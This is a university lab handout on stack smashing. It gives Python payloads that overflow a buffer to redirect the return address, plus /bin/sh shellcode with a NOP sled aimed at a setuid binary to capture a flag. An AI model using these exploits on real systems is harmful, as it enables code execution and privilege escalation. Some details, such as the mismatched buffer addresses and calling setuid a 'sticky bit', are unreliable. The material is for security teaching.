# CSCD27 Lab 9: Stack Smashing Attacks

**Credits:** This lab is built from the excellent materials authored by *Dhaval Kapil*
- [*Dhaval Kapil - Buffer Overflow Exploit*](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)
- [*Dhaval Kapil - Shellcode Injection*](https://dhavalkapil.com/blogs/Shellcode-Injection/)

## Attack 1: Buffer Overflow Exploit

In this attack, we are going to exploit a buffer overflow by branching to an arbitrary location in the program.

### Compiling the program

We compile the code for a 32 bits architecture (although our OS is 64 bits) while disabling the GCC stack protection mechanism.

```shell
cd /vagrant/attack1
gcc vuln.c -o vuln -fno-stack-protector -m32
```

- `-fno-stack-protector` disables the stack protection.
- `-m32` compiles for 32 bit.


### Disassembling the binary

Let us disassemble the binary to look at the assembly instructions:

```shell
objdump -d -M intel vuln
```

While many parts are used to interface the program with the OS, we focus on the relevant parts that are in our source code: the `main` and the functions `echo` and `secretFunction`. We notice that:

1. The address of secretFunction is `0804849d` in hex.
    ```
    0804849d <secretFunction>:
    ```
2. 56 bytes (38 in hex) are reserved for the local variables in the function `echo`.
    ```
    80484c0:	83 ec 38             	sub    esp,0x38
    ```
3. The address of buffer starts 28 bytes (1c in hex) before %ebp. This means that 28 bytes are reserved for buffer even though we asked for 20 bytes.
    ```
    80484cf:	8d 45 e4             	lea    eax,[ebp-0x1c]
    ```

### Testing the overflow

If our observations are correct, our program should produce a buffer overflow if we fill the buffer beyond 28 bytes. First let's create a program called `test.py` that prints 27 times the character 'A'. Including '\n', it produces a string of 28 bytes.

```python
print "a"*27
```

Testing our payload should produce a valid output:

``` shell
python test.py | ./vuln
```

However, modifying the payload to go beyond 28 bytes produces a `segmentation fault`

```python
print "a"*28
```

At this stage, we know that this program has a vulnerability and we will try to exploit it.

### Crafting an attack payload

We know that:

- we have our 28 bytes buffer
- followed by 4 bytes storing the %ebp (the base pointer of the main function)
- followed by 4 bytes storing the return address (the address that %eip is going to jump to after it completes the function)

This means that our payload can fill 32 bytes (28+4) before it overwrites the return address. If we want to jump to the `secretFunction` instead of going back to the `main`, we need to overwrite the return adress with 0804849d in hex. Now depending on whether our machine is little-endian or big-endian we need to decide the proper format of the address to be put. For a little-endian machine we need to put the bytes in the reverse order. i.e. 9d 84 04 08.

The following script generate such a payload:

```python
print "a"*32 + "\x9d\x84\x04\x08"
```

and we can execute our program with this payload:

``` shell
python attack.py | ./vuln
```

## Shellcode Injection

In this attack, we are going to exploit a buffer overflow by executing an arbitrary program, called a *shellcode*, that will be injected in the buffer. In the following, we have chosen a shellcode that will spawn spawn a shell once executed. Depending on the situation and on the size of the buffer, this shellcode might not be adequate. Feel free to chose better ones from [shell-storm.org/](http://shell-storm.org/shellcode/)).

### Compile the program

We compile the code while allowing the stack to be executable (another safety mechanism).

```shell
cd /vagrant/attack2
gcc vuln.c -o vuln -fno-stack-protector -m32 -z execstack
```

- `-z execstack` makes the stack executable

### Disassembling the binary

Let us disassemble the binary to look at the assembly instructions:

```shell
objdump -d -M intel vuln
```
We notice that:

1. 136 bytes (88 in hex) are reserved for the local variables of the function `func`.
    ```
    8048450:	81 ec 88 00 00 00    	sub    esp,0x88
    ```
2. The address of buffer starts 108 bytes (6c in hex) before %ebp. This means that 108 bytes are reserved for buffer even though we asked for 100 bytes.
    ```
     804845d:	8d 45 94             	lea    eax,[ebp-0x6c]
    ```

### Testing the overflow

If our observations are correct, our program should produce a buffer overflow if we fill the buffer beyond 108 bytes. First let's create a program called `test.py` that prints 107 times the character 'A'. Including '\n', it produces a string of 108 bytes.

```python
print "a"*107
```

Testing our payload should produce a valid output:

``` shell
./vuln $(python test.py)
```

However, modifying the payload to go beyond 28 bytes produces a `segmentation fault`

```python
print "a"*108
```

At this stage, we know that this program has a vulnerability and we will try to exploit it.

### Finding the address where the buffer starts

We know that the buffer starts 108 bytes before %ebp. But, how do we know the value of %ebp once the function `func` is executed? That’s where GDB will help us. Since ASRL is disabled, we are sure that no matter how many times the binary is run, the address of the buffer will not change.

1. Start GDB
    ```
    $ gdb -q vuln
    Reading symbols from vuln...(no debugging symbols found)...done.
    ```

2. Add a breakpoint at the function called `func`
    ```
    (gdb) break func
    Breakpoint 1 at 0x8048456
    ```

3. Run the program
    ```
    (gdb) run $(python test.py)
    Starting program: /vagrant/shellcode_injection/vuln $(python test.py)
    Breakpoint 1, 0x08048456 in func ()
    ```

4. Print %ebp
    ```
    (gdb) print $ebp
    $1 = (void *) 0xffffd5e8
    ```

5. Print %ebp - 6c (baseed on our earlier observation)
    ```
    (gdb) print $ebp - 0x6c
    $2 = (void *) 0xffffd57c
    ```

5. Quit GDB
    ```
    (gdb) quit()
    ```

However this might not be the address of the buffer when we run the program outside of gdb. This is because things like environment variables and the name of the program along with arguments are also pushed on the stack. Although, the stack starts at the same address. The difference in the method of running the program will result in the difference of the address of the buffer. The difference will be around few bytes. Nevertheless, we know that the address is located somewhere around `0xffffd57c`.

### Crafting the payload

Now we know that 108 bytes are reserved for the buffer and that this buffer is located somewhere around `0xffffd57c`. At this stage, we do not need to know the exact location of the buffer, instead we will use a technique called a `NOP sled` to slide towards our shellcode in case the beginning of the buffer is not exactly at this location.

More precisely, a `NOP sled` is a sequence of NOP (no-operation) instructions meant to “slide” the CPU’s instruction execution flow to its final, desired, destination whenever the program branches to a memory address anywhere on the sled. Basically, whenever the CPU sees a NOP instruction, it slides down to the next instruction. The processor will keep on executing the NOP instructions until it finds the shellcode.

Therefore, we decide to make the processor jump to the address of the buffer + 20 bytes (0xffffce0c + 20 = 0xffffce20) to get somewhere in the middle of the NOP sled.
Like the previous attack, we know that:

- we have our 108 bytes buffer
- followed by 4 bytes storing the %ebp (the base pointer of the main function)
- followed by 4 bytes storing the return address (the address that %eip is going to jump to after it completes the function)

This means that our payload can fill 112 bytes (108+4) before it overwrites the return address. Therefore, we can design our payload as such:

- 40 bytes for the NOP sled,
- 25 bytes for the shellcode and
- 47 bytes of random instructions ('A' for example)

The following script generate such a payload:

```python
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
print "\x90"*40 + shellcode + "A"*47 + "\x20\xce\xff\xff"
```

and we can execute our program with this payload:

``` shell
python attack.py | ./vuln
```

We obtain a shell for the user `vagrant`:

```shell
$ whoami
vagrant
```

which is not particularly interesting in our case unless ...

## Capturing the flag

... there is a version of the vuln program that runs with higher privileges. For instance, one configuration could be when vuln is own by someone else (let's say `root`) with the [setuid bit](https://en.wikipedia.org/wiki/Setuid) enabled, a.k.a, sticky bit.

```shell
cd /home/vagrant
ls -la vuln
```

That could be useful if you were chasing a flag in a [CTF contest](https://en.wikipedia.org/wiki/Capture_the_flag):

```shell
cd /home/root
cat flag.txt
```






